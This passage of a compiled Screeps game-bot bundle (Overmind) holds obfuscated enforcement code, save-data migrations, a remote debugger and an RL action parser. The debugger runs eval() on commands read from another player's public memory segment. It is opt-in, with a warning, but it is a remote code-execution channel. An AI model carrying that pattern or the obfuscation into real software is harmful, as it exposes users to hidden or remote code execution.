_0x2846ef=_0x4e5e12[_0x9e16('0x60')][_0x9e16('0x61')];if(_0x2846ef[_0x9e16('0x62')]()[_0x9e16('0x63')](_0x9e16('0x64'))||_0x2846ef[_0x9e16('0x63')](_0x9e16('0x65'))){_0x180b13=!![];}}if(!_0x180b13){_0x3ee848[_0x9e16('0x28')](_0x4e5e12[_0x9e16('0x60')]?_0x4e5e12[_0x9e16('0x60')][_0x9e16('0x61')]:_0x9e16('0x66'));}}if(_0x3ee848[_0x9e16('0x4')]>=0.5*_[_0x9e16('0x1')](Overmind[_0x9e16('0xc')])[_0x9e16('0x4')]){Memory[_0x9e16('0x67')][_0x9e16('0x68')]=DEFAULT_OVERMIND_SIGNATURE;log[_0x9e16('0x2a')](_0x9e16('0x69')+bulleted(_0x3ee848)+alignedNewline+_0x9e16('0x6a')+(_0x9e16('0x65')+'.'));throw new Error(_0x9e16('0x6b'));}}static[_0x9e16('0x6c')](){if(!Assimilator[_0x9e16('0x6d')](MY_USERNAME)){const _0x5a2622=[[COLOR_RED,COLOR_RED]];for(const _0x2c0dbd in Game[_0x9e16('0x3e')]){const _0x3a00ca=Game[_0x9e16('0x3e')][_0x2c0dbd];const _0x1c0b76=[_0x3a00ca[_0x9e16('0x6e')],_0x3a00ca[_0x9e16('0x6f')]];if(_0x5a2622[_0x9e16('0x63')](_0x1c0b76)){}}}}static[_0x9e16('0x51')](){this[_0x9e16('0x5c')]();if(Game[_0x9e16('0xa')]%(0x3*0x1f)==0x0){this[_0x9e16('0x6c')]();}}}class VersionUpdater{static get[_0x9e16('0x5')](){return Mem[_0x9e16('0x70')](Memory[_0x9e16('0x6')],_0x9e16('0x71'),{'versions':{},'newestVersion':undefined});}static[_0x9e16('0x72')](){if(Game[_0x9e16('0xa')]%this[_0x9e16('0x73')]==this[_0x9e16('0x74')]-0x1){Segmenter[_0x9e16('0x75')](MUON,this[_0x9e16('0x76')]);}else if(Game[_0x9e16('0xa')]%this[_0x9e16('0x73')]==this[_0x9e16('0x74')]){const _0x25ce0d=Segmenter[_0x9e16('0x77')]();if(_0x25ce0d){return _0x25ce0d[_0x9e16('0x78')];}}}static[_0x9e16('0x56')](_0xaa5430){const [_0x2ae244,_0x5391fd,_0x24c5a1]=_[_0x9e16('0x32')](__VERSION__[_0x9e16('0x79')]('.'),_0x2ae98a=>parseInt(_0x2ae98a,0xa));const [_0x34116f,_0x2e335f,_0xc5c749]=_[_0x9e16('0x32')](_0xaa5430[_0x9e16('0x79')]('.'),_0x129f43=>parseInt(_0x129f43,0xa));return _0x34116f>_0x2ae244||_0x2e335f>_0x5391fd||_0xc5c749>_0x24c5a1;}static[_0x9e16('0x7a')](){if(Game[_0x9e16('0xa')]%this[_0x9e16('0x73')]==this[_0x9e16('0x74')]-0x2){Segmenter[_0x9e16('0x7b')](this[_0x9e16('0x76')]);}else if(Game[_0x9e16('0xa')]%this[_0x9e16('0x73')]==this[_0x9e16('0x74')]-0x1){Segmenter[_0x9e16('0x7c')](this[_0x9e16('0x76')]);Segmenter[_0x9e16('0x7d')](this[_0x9e16('0x76')],_0x9e16('0x78'),__VERSION__);}}static[_0x9e16('0x7e')](_0x504723,_0x19a7e9){let _0x5d0856='\x0a';for(const _0x425873 of asciiLogoSmall){_0x5d0856+=_0x425873+'\x0a';}const _0x52d706=_0x9e16('0x7f');const _0x2227a9=_0x9e16('0x80');const _0x23de82=_0x9e16('0x81')+(_0x9e16('0x82')+_0x504723+_0x9e16('0x58')+_0x19a7e9+_0x9e16('0x83'))+(_0x9e16('0x84')+_0x52d706+_0x9e16('0x85')+_0x2227a9+_0x9e16('0x86'))+_0x9e16('0x87');return _0x5d0856+_0x23de82;}static[_0x9e16('0x88')](_0x3af0f4,_0x492f50){const _0x207d2f=_0x9e16('0x7f');const _0x5e5126=_0x9e16('0x80');const _0x64ac05=_0x9e16('0x89')+_0x9e16('0x8a')+_0x9e16('0x8b')+(_0x9e16('0x8c')+_0x3af0f4+_0x9e16('0x58')+_0x492f50+_0x9e16('0x8d'))+(_0x9e16('0x8e')+_0x207d2f+_0x9e16('0x85')+_0x5e5126+_0x9e16('0x8f'))+_0x9e16('0x90');return '\x0a'+_0x64ac05;}static[_0x9e16('0x91')](_0x4ee7ac){const _0x44c6f2=this[_0x9e16('0x7e')](__VERSION__,_0x4ee7ac);console[_0x9e16('0x4e')](_0x9e16('0x92')+_0x44c6f2+_0x9e16('0x93'));}static[_0x9e16('0x94')](_0xef121e){for(const _0x15d424 in Game[_0x9e16('0x5e')]){const _0x3c552a=Game[_0x9e16('0x5e')][_0x15d424];_0x3c552a[_0x9e16('0x95')](_0x9e16('0x96'),!![]);}}static[_0x9e16('0x97')](_0x57ca27){const _0x458837=this[_0x9e16('0x88')](__VERSION__,_0x57ca27);Game[_0x9e16('0x98')](_0x9e16('0x92')+_0x458837+_0x9e16('0x93'));}static[_0x9e16('0x51')](){if(MY_USERNAME==MUON){this[_0x9e16('0x7a')]();}const _0x299af9=this[_0x9e16('0x72')]();if(_0x299af9){this[_0x9e16('0x5')][_0x9e16('0x55')]=_0x299af9;}const _0x2cb767=this[_0x9e16('0x5')][_0x9e16('0x55')];if(_0x2cb767&&this[_0x9e16('0x56')](_0x2cb767)){if(Game[_0x9e16('0xa')]%0xa==0x0){this[_0x9e16('0x91')](_0x2cb767);this[_0x9e16('0x94')](_0x2cb767);}if(Game[_0x9e16('0xa')]%0x2710==0x0){this[_0x9e16('0x97')](_0x2cb767);}}}}VersionUpdater[_0x9e16('0x73')]=0x64;VersionUpdater[_0x9e16('0x74')]=0x5b;VersionUpdater[_0x9e16('0x76')]=0x63;

/* tslint:disable:no-string-literal */
/**
 * The VersionMigration class contains ad-hoc methods for migrating older versions of Overmind to newer versions
 */
class VersionMigration {
    static run() {
        /*
        if (!this.memory.versions['02Xto03X']) {
            this.migrate_02X_03X();
        }
        if (!this.memory.versions['03Xto04X']) {
            this.migrate_03X_04X();
        }
        if (!this.memory.versions['04Xto05X']) {
            this.migrate_04X_05X();
        }
        if (!this.memory.versions['04Xto05X_part2']) {
            this.migrate_04X_05X_part2();
        }
        if (!this.memory.versions['04Xto05X_part3']) {
            this.migrate_04X_05X_part3();
        }
        */
        if (!this.memory.versions['05Xto051']) {
            this.migrate_050_051();
        }
        if (!this.memory.versions['05Xto051_part2']) {
            this.migrate_050_051_part2();
        }
        if (!this.memory.versions['05Xto051_part3']) {
            this.migrate_050_051_part3();
        }
        if (!this.memory.versions['05Xto051_part4']) {
            this.migrate_050_051_part4();
        }
        if (!this.memory.versions['051to052']) {
            this.migrate_051_052();
        }
        if (!this.memory.versions['052to053']) {
            this.migrate_052_053();
        }
    }
    static get memory() {
        return Mem.wrap(Memory.Overmind, 'versionMigrator', {
            versions: {}
        });
    }
    /*
    static migrate_02X_03X() {
        // This technically won't run correctly because it gets run only on global reset, but no one is using v0.2.x
        // anymore anyway, so I don't feel the need to maintain support for this function
        let allColoniesUpdated = true;
        let i = 0;
        for (let name in Memory.colonies) {
            let rpMemory = Memory.colonies[name].roomPlanner;
            let lastBuilt = rpMemory.lastGenerated;
            // Reboot colony room planners one at a time every 3 ticks
            if (!lastBuilt) {
                allColoniesUpdated = false;
                if (Game.time % 100 == 3 * i) {
                    // Delete all white/white routing hints from memory
                    rpMemory.savedFlags = _.filter(rpMemory.savedFlags, (flag: {secondaryColor: number}) =>
                        flag.secondaryColor != COLOR_WHITE);
                    rpMemory.active = true;
                    log.alert(`Version migration: rebooting roomPlanner for colony ${name}!`);
                } else if (Game.time % 100 == 3 * i + 1) {
                    colony.roomPlanner.finalize(true);
                }
            }
        }
        if (allColoniesUpdated) {
            this.memory.versions['02Xto03X'] = true;
            log.alert(`Version migration from 0.2.x -> 0.3.x completed successfully.`);
        }
    }

    static migrate_03X_04X() {
        // Update creep memory
        for (let i in Memory.creeps) {
            // Migrate all old-style overlord references to new ones
            if (Memory.creeps[i].overlord) {
                let hcName = Memory.creeps[i].overlord!.split(':')[0];
                if (hcName == 'commandCenter'
                    || hcName == 'hatchery'
                    || hcName == 'evolutionChamber'
                    || hcName == 'miningSite'
                    || hcName == 'upgradeSite') {
                    let id = Memory.creeps[i].overlord!.split(':')[1];
                    let roomObject = Game.getObjectById(id) as RoomObject | undefined;
                    if (roomObject) {
                        let overlordName = Memory.creeps[i].overlord!.split(':')[2];
                        Memory.creeps[i].overlord = hcName + '@' + roomObject.pos.name + ':' + overlordName;
                    }
                }
            }
            // Change all miner roles to drone roles
            if (Memory.creeps[i].role == 'miner') {
                Memory.creeps[i].role = 'drone';
            }
        }
        // Delete old-style miningSite overlords from memory
        OvermindConsole.deepCleanMemory();
        this.memory.versions['03Xto04X'] = true;
        log.alert(`Version migration from 0.3.x -> 0.4.x completed successfully.`);
    }

    static migrate_04X_05X() {
        let migrateClusterNames = ['commandCenter', 'evolutionChamber', 'hatchery', 'upgradeSite'];
        for (let i in Memory.creeps) {
            if (Memory.creeps[i].overlord) {
                let hcName = Memory.creeps[i].overlord!.split('@')[0];
                if (migrateClusterNames.includes(hcName)) {
                    let overlordName = _.last(Memory.creeps[i].overlord!.split(':'));
                    if (overlordName == 'hatchery') {
                        overlordName = 'supply';
                    }
                    let colonyName = Memory.creeps[i].colony;
                    Memory.creeps[i].overlord = hcName + '@' + colonyName + ':' + overlordName;
                }
            }
        }
        for (let i in Memory.rooms) {
            delete (<any>Memory.rooms[i]).tick;
            delete (<any>Memory.rooms[i]).score;
        }
        // Change to new signature
        let oldSignature = '[Overmind]';
        if ((<any>Memory).signature && (<any>Memory).signature.includes(oldSignature)) {
            (<any>Memory).signature = (<any>Memory).signature.replace(oldSignature, DEFAULT_OVERMIND_SIGNATURE);
        }
        this.memory.versions['04Xto05X'] = true;
        log.alert(`Version migration from 0.4.x -> 0.5.x (part 1) completed successfully.`);
    }

    static migrate_04X_05X_part2() {
        // Copy old memory to new memory locations
        if (Memory.signature) {
            Memory.settings.signature = (<any>Memory).signature;
        }
        delete (<any>Memory).signature;
        delete (<any>Memory).bot;
        delete (<any>Memory).log;
        delete (<any>Memory).autoclaim;
        this.memory.versions['04Xto05X_part2'] = true;
        log.alert(`Version migration from 0.4.x -> 0.5.x (part 2) completed successfully.`);
    }

    static migrate_04X_05X_part3() {
        for (let i in Memory.creeps) {
            if (Memory.creeps[i].overlord) {
                let ref = Memory.creeps[i].overlord as string;
                let n = ref.lastIndexOf(':');
                ref = ref.slice(0, n) + ref.slice(n).replace(':', '>');
                Memory.creeps[i].overlord = ref;
            }
        }
        this.memory.versions['04Xto05X_part3'] = true;
        log.alert(`Version migration from 0.4.x -> 0.5.x (part 3) completed successfully.`);
    }

    */
    static migrate_050_051() {
        // Destroy all links that aren't hatchery or commandCenter links
        for (const id in Game.structures) {
            const s = Game.structures[id];
            if (s.structureType == STRUCTURE_LINK) {
                const isCommandCenterLink = s.pos.findInRange(_.compact([s.room.storage,
                    s.room.terminal]), 2).length > 0;
                const isHatcheryLink = s.pos.findInRange(s.room.spawns, 2).length > 0;
                if (!isCommandCenterLink && !isHatcheryLink) {
                    s.destroy();
                }
            }
        }
        let count = 0;
        for (const name in Game.creeps) {
            const creep = Game.creeps[name];
            if (creep.memory.role == 'drone' &&
                creep.memory.overlord && creep.memory.overlord.includes('miningSite')) {
                creep.suicide();
                count++;
            }
        }
        this.memory.versions['05Xto051'] = true;
        log.alert(`Genocide complete: suicided ${count} innocent drones.`);
        log.alert(`Version migration from 0.5.0 -> 0.5.1 (part 1) completed successfully.`);
    }
    static migrate_050_051_part2() {
        // Destroy all links that aren't hatchery or commandCenter links
        for (const name in Game.creeps) {
            const creep = Game.creeps[name];
            if (creep.memory.role == 'reserver') {
                creep.memory.role = 'infestor';
            }
            else if (creep.memory.role == 'guard') {
                creep.memory.role = 'broodling';
            }
        }
        this.memory.versions['05Xto051_part2'] = true;
        log.alert(`Version migration from 0.5.0 -> 0.5.1 (part 2) completed successfully.`);
    }
    static migrate_050_051_part3() {
        if (Memory.assimilator && Memory.assimilator.users) {
            delete Memory.assimilator.users;
        }
        this.memory.versions['05Xto051_part3'] = true;
        log.alert(`Version migration from 0.5.0 -> 0.5.1 (part 3) completed successfully.`);
    }
    static migrate_050_051_part4() {
        const protectedKeywords = ['suspendUntil', 'amount', 'created', 'persistent', 'setPosition', 'rotation',
            'colony', 'parent', 'pathing', 'stats', 'safeTick', 'enhanced', 'persistent',
            'recoveryWaypoint', 'totalResources', 'maxPathLength', 'maxLinearRange'];
        for (const name in Memory.flags) {
            for (const prop in Memory.flags[name]) {
                if (!protectedKeywords.includes(prop)) {
                    delete Memory.flags[name][prop];
                }
            }
        }
        this.memory.versions['05Xto051_part4'] = true;
        log.alert(`Version migration from 0.5.0 -> 0.5.1 (part 4) completed successfully.`);
    }
    static migrate_051_052() {
        if (__VERSION__ == '0.5.2') {
            for (const name in Game.creeps) {
                if (name.includes('mutalisk')) {
                    Game.creeps[name].suicide();
                }
            }
        }
        this.memory.versions['051to052'] = true;
        log.alert(`Version migration from 0.5.1 -> 0.5.2 completed successfully.`);
    }
    static migrate_052_053() {
        // Reformat flag and harvest directive memory
        const newFlagKeys = {
            created: "T" /* TICK */,
            expiration: "X" /* EXPIRATION */,
            overlord: "O" /* OVERLORD */,
            colony: "C" /* COLONY */,
        };
        for (const name in Memory.flags) {
            // Replace old keys with new ones
            Memory.flags[name] = _.mapKeys(Memory.flags[name], function (value, key) {
                return newFlagKeys[key] || key;
            });
            // Special opertions for harvest flags
            if (name.includes('harvest:')) {
                const pathing = Memory.flags[name].pathing;
                if (pathing) {
                    Memory.flags[name]['P'] = {
                        D: pathing.distance,
                        X: pathing.expiration,
                    };
                    delete Memory.flags[name].pathing;
                }
                Memory.flags[name]['u'] = Memory.flags[name].stats.usage;
                Memory.flags[name]['d'] = Memory.flags[name].stats.downtime;
                delete Memory.flags[name].stats;
            }
        }
        // Reformat creep memory
        const newCreepKeys = {
            overlord: "O" /* OVERLORD */,
            colony: "C" /* COLONY */,
        };
        for (const name in Memory.creeps) {
            // Replace old keys with new ones
            Memory.creeps[name] = _.mapKeys(Memory.creeps[name], function (value, key) {
                return newCreepKeys[key] || key;
            });
        }
        // Delete outdated colony memory properties
        for (const name in Memory.colonies) {
            for (const key in Memory.colonies[name]) {
                if (key.includes('miningSite@')) {
                    delete Memory.colonies[name][key];
                }
            }
        }
        // Delete ALL room memory
        for (const name in Memory.rooms) {
            delete Memory.rooms[name];
        }
        this.memory.versions['052to053'] = true;
        log.alert(`Version migration from 0.5.2 -> 0.5.3 completed successfully.`);
    }
}

/* tslint:disable:no-eval */
const DEBUG_SEGMENT = 97;
const DEBUG_TIMEOUT = 1000;
const NO_COMMAND = 'No command';
const defaultDebuggerMemory = {
    username: undefined,
    enabled: false,
    expiration: 0,
    command: undefined,
    response: undefined,
};
const DEBUGGER = color('[DEBUGGER]', '#ff00ff');
/**
 * Debugging tool which lets me remotely debug other Overmind players' code by communicating through public memory
 * segments. Can be toggled on and off with console commands startRemoteDebugSession() and endRemoteDebugSession().
 */
class RemoteDebugger {
    constructor() {
        if (!Memory.remoteDebugger) {
            Memory.remoteDebugger = {};
        }
        _.defaultsDeep(Memory.remoteDebugger, defaultDebuggerMemory);
    }
    get memory() {
        return Memory.remoteDebugger;
    }
    /**
     * Push all commands from secret memory to public memory and clear secret memory commands
     */
    pushCommands_master() {
        Segmenter.setSegmentProperty(DEBUG_SEGMENT, 'command', this.memory.command);
        if (this.memory.command) {
            log.info(`[DEBUGGER] Sending command: ${this.memory.command}`);
        }
        this.memory.command = undefined;
    }
    /**
     * Fetch the response from the debugee
     */
    fetchResponse_master() {
        const response = Segmenter.getForeignSegmentProperty('response');
        return response;
    }
    /**
     * Execute the commands you are given
     */
    fetchCommands_slave() {
        const cmd = Segmenter.getForeignSegmentProperty('command');
        if (cmd) {
            log.info(`[DEBUGGER] Executing command: ${cmd}`);
            const response = eval(cmd);
            log.info(`[DEBUGGER] Relaying response: ${response}`);
            this.memory.response = JSON.stringify(response);
        }
        else {
            this.memory.response = NO_COMMAND;
        }
    }
    /**
     * Push the response from the last run command
     */
    pushResponse_slave() {
        Segmenter.setSegmentProperty(DEBUG_SEGMENT, 'response', this.memory.response);
        this.memory.response = undefined;
    }
    extendSession() {
        this.memory.expiration = Game.time + DEBUG_TIMEOUT;
    }
    enable() {
        this.memory.enabled = true;
        this.memory.expiration = Game.time + DEBUG_TIMEOUT;
        log.info(`[DEBUGGER] Starting remote debug session. Timeout: ${this.memory.expiration} ` + alignedNewline +
            `Warning: this enables remote arbitrary code execution!`);
    }
    disable() {
        this.memory.enabled = false;
        this.memory.expiration = -1;
        log.info(`[DEBUGGER] Remote debugging session ended`);
    }
    connect(username) {
        this.memory.username = username;
        this.memory.enabled = true;
        this.memory.expiration = Game.time + DEBUG_TIMEOUT;
        log.info(`[DEBUGGER] Starting remote debug session with ${username}. Timeout: ${this.memory.expiration}`);
    }
    cancelCommand() {
        this.memory.command = undefined;
    }
    /* Register a debug command to be sent to the user */
    debug(command) {
        this.memory.command = command;
        return `[DEBUGGER] Sending command next tick.`;
    }
    run_master() {
        if (Game.time % 2 == 0) {
            const response = this.fetchResponse_master();
            if (response && response != NO_COMMAND) {
                log.info(`[DEBUGGER] Response: ` + response);
            }
            this.pushCommands_master();
        }
    }
    run_slave() {
        if (Game.time % 2 == 1) {
            this.fetchCommands_slave();
            this.pushResponse_slave();
        }
    }
    run() {
        if (this.memory.enabled) {
            // Run the debugger
            if (MY_USERNAME == MUON) {
                if (this.memory.username) {
                    Segmenter.requestSegments(DEBUG_SEGMENT);
                    Segmenter.requestForeignSegment(this.memory.username, DEBUG_SEGMENT);
                    Segmenter.markSegmentAsPublic(DEBUG_SEGMENT);
                    this.run_master();
                }
            }
            else {
                Segmenter.requestSegments(DEBUG_SEGMENT);
                Segmenter.requestForeignSegment(MUON, DEBUG_SEGMENT);
                Segmenter.markSegmentAsPublic(DEBUG_SEGMENT);
                this.run_slave();
            }
            if (Game.time % 20 == 0) {
                log.alert(`[DEBUGGER] Remote session is still enabled! Expiration: ${this.memory.expiration}`);
            }
            // Disable after timeout
            if (!this.memory.expiration || Game.time > this.memory.expiration) {
                this.disable();
            }
        }
    }
}

const RL_ACTION_SEGMENT = 70;
/**
 * The ActionParser provides a line of direct interaction for the external Python optimizers to control
 * creep actions via the Memory.reinforcementLearning object.
 */
class ActionParser {
    /**
     * Determine the list of actions for each Zerg to perform
     */
    static parseActions(serializedActions) {
        for (const creepName in serializedActions) {
            const creep = Game.creeps[creepName];
            if (!creep) {
                console.log(`No creep with name ${creepName}!`);
            }
            else {
                for (const action of serializedActions[creepName]) {
                    const [command, id] = action;
                    const targ = typeof id == 'string' ? Game.getObjectById(id) : null;
                    switch (command) {
                        case 'move':
                            creep.move(id);
                            break;
                        case 'moveTo':
                            if (targ)
                                creep.moveTo(targ);
                            break;
                        case 'attack':
                            if (targ)
                                creep.attack(targ);
                            break;
                        case 'rangedAttack':
                            if (targ)
                                creep.rangedAttack(targ);
                            break;
                        case 'rangedMassAttack':
                            creep.rangedMassAttack();
                            break;
                        case 'heal':
                            if (targ) {
                                creep.heal(targ);
                            }
                            else if (typeof id != 'string') {
                                creep.heal(creep);
                            }
                            break;
                        case 'rangedHeal':
                            if (targ)
                                creep.rangedHeal(targ);
                            break;
                        default:
                            console.log(`Invalid command: ${command}!`);
                            break;
                    }
                }
            }
        }
    }
    /**
     * Periodic logging functions that are used to describe state of training map and identify bugs
     */
    static logState(contents) {
        console.log(`[${Game.time}] My creeps: `, _.map(Game.creeps, creep => creep.name + ' ' + creep.pos));
        if (Memory.reinforcementLearning) {
            console.log(`[${Game.time}] RL Segment: ${contents}`);
        }
    }
    /**
     * Wraps all creeps as Zerg
     */
    static wrapZerg(useCombatZerg = true) {
    }
    /**
     * Read action commands from the designated memory segment, parse them, and run them
     */
    static run() {
        const raw = RawMemory.segments[RL_ACTION_SEGMENT];
        if (raw != undefined && raw != '') {
            const actions = JSON.parse(raw);
            ActionParser.parseActions(actions);
        }
        RawMemory.setActiveSegments([RL_ACTION_SEGMENT]); // keep this segment requested during training
        // Log state according to verbosity
        if (RL_TRAINING_VERBOSITY == 0) {
            // no logigng
        }
        else if (RL_TRAINING_VERBOSITY == 1) {
            if (Game.time % 100 == 0 || Game.time % 100 == 1) {
                this.logState(raw);
            }
        }
        else if (RL_TRAINING_VERBOSITY == 2) {
            this.logState(raw);
        }
    }
}

//
// ___________________________________________________________
//
//  _____  _    _ _______  ______ _______ _____ __   _ ______
// |     |  \  /  |______ |_____/ |  |  |   |   | \  | |     \
// |_____|   \/   |______ |    \_ |  |  | __|__ |  \_| |_____/
//
// _______________________ Screeps AI ________________________
//
//
// Overmind repository: github.com/bencbartlett/overmind
//
// @formatter:off
/* tslint:disable:ordered-imports */
'use strict';
// =====================================================================================================================
// Main loop
function main() {
    // Memory operations: load and clean memory, suspend operation as needed
    Mem.load(); // Load previous parsed memory if present
    if (!Mem.shouldRun())
        return; // Suspend operation if necessary
    Mem.clean(); // Clean memory contents
    // Instantiation operations: build or refresh the game state
    if (!Overmind || Overmind.shouldBuild || Game.time >= Overmind.expiration) {
        delete global.Overmind; // Explicitly delete the old Overmind object
        Mem.garbageCollect(true); // Run quick garbage collection
        global.Overmind = new _Overmind$1(); // Instantiate the Overmind object
        Overmind.build(); // Build phase: instantiate all game components
    }
    else {
        Overmind.refresh(); // Refresh phase: update the Overmind state
    }
    // Tick loop cycle: initialize and run each component
    Overmind.init(); // Init phase: spawning and energy requests
    Overmind.run(); // Run phase: execute state-changing actions
    Overmind.visuals(); // Draw visuals
    Stats.run(); // Record statistics
    // Post-run code: handle sandbox code and error catching
    sandbox(); // Sandbox: run any testing code
    global.remoteDebugger.run(); // Run remote debugger code if enabled
    Overmind.postRun(); // Error catching is run at end of every tick
}
// Main loop if RL mode is enabled (~settings.ts)
function main_rl() {
    ActionParser.run();
}
// This gets run on each global reset
function onGlobalReset() {
    if (USE_PROFILER)
        screepsProfiler.enable();
    Mem.format();
    OvermindConsole.init();
    VersionMigration.run();
    Memory.stats.persistent.lastGlobalReset = Game.time;
    OvermindConsole.printUpdateMessage();
    // Update the master ledger of valid checksums
    if (MY_USERNAME == MUON) {
        Assimilator.updateValidChecksumLedger();
    }
    // Make a new Overmind object
    global.Overmind = new _Overmind$1();
    // Make a remote debugger
    global.remoteDebugger = new RemoteDebugger();
}
// Decide which loop to export as the script loop
let _loop;
if (RL_TRAINING_MODE) {
    // Use stripped version for training reinforcment learning model
    _loop = main_rl;
}
else {
    if (USE_PROFILER) {
        // Wrap the main loop in the profiler
        _loop = () => screepsProfiler.wrap(main);
    }
    else {
        // Use the default main loop
        _loop = main;
    }
}
const loop = _loop;
if (RL_TRAINING_MODE) {
    OvermindConsole.printTrainingMessage();
}
else {
    // Register these functions for checksum computations with the Assimilator
    Assimilator.validate(main);
    Assimilator.validate(loop);
    // Run the global reset code
    onGlobalReset();
}

exports.loop = loop;
